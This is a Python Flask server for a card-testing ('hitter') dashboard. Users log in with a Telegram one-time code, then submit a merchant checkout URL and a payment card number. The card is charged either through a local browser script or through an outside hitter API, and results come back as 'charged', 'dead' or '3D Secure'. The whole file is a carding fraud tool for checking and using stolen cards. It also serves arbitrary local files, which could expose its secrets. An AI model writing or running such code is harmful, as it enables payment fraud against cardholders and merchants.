from flask import Flask, send_from_directory, request, jsonify, session
import os
import random
import requests
import subprocess
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.secret_key = os.urandom(24)

# Global variables
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
API_KEY = os.getenv("HITTER_API_KEY")
API_URL = "https://hitter1month.replit.app"

# Temporary storage for codes (In-memory)
otp_storage = {}

def send_telegram_msg(chat_id, text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
        requests.post(url, json=payload)
    except Exception as e:
        print(f"❌ Failed to send Telegram message: {e}")

@app.route("/")
def index():
    return send_from_directory(".", "index.html")

@app.route("/<path:path>")
def static_files(path):
    return send_from_directory(".", path)

# --- AUTH API ---

@app.route("/api/send-otp", methods=["POST"])
def send_otp():
    data = request.json
    chat_id = data.get("chat_id")
    if not chat_id:
        return jsonify({"success": False, "message": "Chat ID is required"}), 400

    code = str(random.randint(100000, 999999))
    otp_storage[str(chat_id)] = code
    
    msg = f"🔐 <b>Your Login Code:</b>\n\n<code>{code}</code>\n\nDo not share this with anyone."
    send_telegram_msg(chat_id, msg)
    
    return jsonify({"success": True, "message": "Code sent to Telegram"})

@app.route("/api/verify-otp", methods=["POST"])
def verify_otp():
    data = request.json
    chat_id = str(data.get("chat_id"))
    code = str(data.get("code"))
    
    if otp_storage.get(chat_id) == code:
        session["chat_id"] = chat_id
        # Optional: delete code after use
        # del otp_storage[chat_id]
        return jsonify({"success": True, "message": "Login successful"})
    else:
        return jsonify({"success": False, "message": "Invalid code"}), 401

# --- HITTER API ---

@app.route("/api/hit", methods=["POST"])
def hit():
    if "chat_id" not in session:
        return jsonify({"success": False, "message": "Unauthorized"}), 401
    
    data = request.json
    gate = data.get("gate", "checkout")
    url = data.get("url")
    card = data.get("card")
    use_browser = data.get("use_browser", False)
    
    if not url or not card:
        return jsonify({"success": False, "message": "URL and Card are required"}), 400

    if use_browser:
        # Launch LOCAL browser script
        print(f"🖥️ Launching local browser for card {card}...")
        try:
            # We run it as a background process so the server keeps responding? 
            # Or run synchronously for logging. Synchronous is easier for UI status updates.
            process = subprocess.run(["python", "browser_hitter.py", url, card], capture_output=True, text=True)
            output = process.stdout
            
            if "SUCCESS" in output:
               return jsonify({"status": "charged", "message": "Charged Successfully (Browser)"})
            elif "FAILURE" in output:
               return jsonify({"status": "dead", "message": "Card Declined (Browser)"})
            elif "3DS" in output:
               return jsonify({"status": "3ds", "message": "3D Secure Required"})
            else:
               return jsonify({"status": "error", "message": "Unknown Browser Error", "details": output})
        except Exception as e:
            return jsonify({"status": "error", "message": f"Execution Error: {str(e)}"}), 500
    else:
        # API Hitting
        try:
            headers = {"X-API-Key": API_KEY, "Content-Type": "application/json"}
            payload = {"url": url, "card": card}
            response = requests.post(f"{API_URL}/hit/{gate}", json=payload, headers=headers, timeout=120)
            return jsonify(response.json())
        except Exception as e:
            return jsonify({"status": "error", "message": f"API Error: {str(e)}"}), 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print(f"✅ Dashboard Server running at http://localhost:{port}")
    app.run(host="0.0.0.0", port=port)
